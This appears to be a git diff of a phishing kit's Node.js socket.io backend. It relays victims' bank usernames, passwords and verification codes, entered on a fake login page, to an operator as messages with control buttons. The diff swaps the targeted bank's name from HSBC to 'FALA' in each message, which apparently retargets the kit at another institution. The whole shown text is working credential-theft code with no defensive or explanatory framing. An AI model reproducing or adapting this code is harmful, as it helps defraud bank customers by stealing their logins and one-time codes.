@@ -30,7 +30,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso HSBC:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
+    const mensaje = `🔐 Nuevo intento de acceso FALA:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -50,7 +50,7 @@ io.on('connection', (socket) => {
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código HSBC:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código FALA:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -90,7 +90,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado HSBC:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado FALA:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
